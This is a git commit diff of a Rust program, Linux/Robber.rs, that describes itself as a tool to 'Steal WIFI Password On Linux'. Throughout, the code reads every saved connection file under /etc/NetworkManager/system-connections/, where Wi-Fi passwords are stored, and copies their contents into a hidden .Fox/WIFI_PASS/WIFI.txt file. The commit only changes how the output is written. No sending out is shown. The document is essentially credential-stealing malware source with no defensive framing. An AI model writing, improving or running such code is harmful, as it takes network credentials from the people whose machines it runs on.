a159807559e77a3b742855a5079432a3dd6430d0
Mr-Fox-h <mr.fox@iran.ir>
2022-02-16 05:13:40 -1100

    53 commit

--- Linux/Robber.rs
+++ Linux/Robber.rs
@@ -1,24 +1,23 @@
 use std::fs;
 use std::fs::File;
 use std::io::prelude::*;
+use std::io::{BufWriter, Write};
 
 fn main() {
     let paths = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();
-    let mut file_number: u8 = 0;
     fs::create_dir_all(".Fox").expect("Error! File exist.\n");
     fs::create_dir_all(".Fox/WIFI_PASS").expect("Error! File exist.\n");
+    let file_name = File::create(".Fox/WIFI_PASS/WIFI.txt").expect("Error! File exist.\n");
+    let mut file_name = BufWriter::new(file_name);
     for index in paths {
-        file_number += 1;
-        //println!("{}", index.unwrap().path().display().to_string());
-        //steal_wifi_pas(index.unwrap().path().display().to_string());
-        fs::write(".Fox/WIFI_PASS/WIFI-.txt", steal_wifi_pas(index.unwrap().path().display().to_string())).expect("Unable to write file");
+        write!(file_name, "{}", steal_wifi_pas(index.unwrap().path().display().to_string())).expect("Unable to write file");
     }
 }
 
 //Steal WIFI Password On Linux
 fn steal_wifi_pas(source: String) -> String {
-    let mut files = File::open(&source).expect("Error! No file.\n");
+    let mut files = File::open(&source).expect("Error! No file.");
     let mut context: String = String::new();
-    files.read_to_string(&mut context).expect("Error! Not readable.\n");
+    files.read_to_string(&mut context).expect("Error! Not readable.");
     return context;
 }
